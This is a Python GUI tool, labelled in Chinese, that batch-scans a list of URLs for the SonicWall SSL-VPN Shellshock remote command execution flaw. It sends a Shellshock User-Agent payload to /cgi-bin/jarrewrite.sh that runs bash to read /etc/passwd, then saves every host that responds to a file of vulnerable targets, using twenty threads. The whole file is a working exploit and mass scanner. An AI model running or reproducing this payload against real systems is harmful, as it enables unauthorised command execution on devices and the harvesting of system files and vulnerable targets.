import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
from requests import exceptions
import urllib3
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)
def sonicwall_ssl_vpn_verify(url):
    url = 'https://' + url.replace('https://', '').replace('/', '')
    reqUrl = url + '/cgi-bin/jarrewrite.sh'
    header = {'User-Agent': '() { :; }; echo ; /bin/bash -c "cat /etc/passwd"'}
    try:
        r = requests.get(reqUrl, headers=header, verify=False, timeout=10)
        if r.status_code == 200 and 'root:' in r.text:
            sonicwall_ssl_vpn_text.insert(END, "【！！！！！！】存在漏洞的url：" + url + "\n")
            sonicwall_ssl_vpn_text.see(END)
            return 1
        else:
            sonicwall_ssl_vpn_text.insert(END, "【×××】不存在漏洞的url：" + url + "\n")
            sonicwall_ssl_vpn_text.see(END)
    except exceptions.HTTPError as e:
        sonicwall_ssl_vpn_text.insert(END, "【×××】测试" + url + "时出现HTTP异常，错误内容:" + str(e.message) + "\n")
        sonicwall_ssl_vpn_text.see(END)
    except:
        sonicwall_ssl_vpn_text.insert(END, "【×××】不存在漏洞的url：" + url + "\n")
        sonicwall_ssl_vpn_text.see(END)
    return 0
def sonicwall_ssl_vpn_batch_verify(url):
    try:
        if sonicwall_ssl_vpn_verify(url) == 1:
            with open("存在SonicWall SSL-VPN 远程命令执行漏洞的url.txt", "a+") as f:
                f.write(url + "\n")
            f.close()
    except Exception as err:
        sonicwall_ssl_vpn_text.insert(END, "【×××】出现错误，错误原因：" + str(err) + "\n")
        sonicwall_ssl_vpn_text.see(END)
def get_sonic_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def sonicwall_ssl_vpn_gui():
    sonicwall_ssl_vpn = tk.Tk()
    sonicwall_ssl_vpn.geometry("910x450")
    sonicwall_ssl_vpn.title("SonicWall SSL-VPN 远程命令执行漏洞一把梭")
    sonicwall_ssl_vpn.resizable(0, 0)
    sonicwall_ssl_vpn.iconbitmap('logo.ico')
    global sonicwall_ssl_vpn_text
    sonicwall_ssl_vpn_text = scrolledtext.ScrolledText(sonicwall_ssl_vpn,width=123, height=25)
    sonicwall_ssl_vpn_text.grid(row=0, column=0, padx=10, pady=10)
    sonicwall_ssl_vpn_text.see(END)
    addrs = get_sonic_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(sonicwall_ssl_vpn_batch_verify, addr)
    sonicwall_ssl_vpn.mainloop()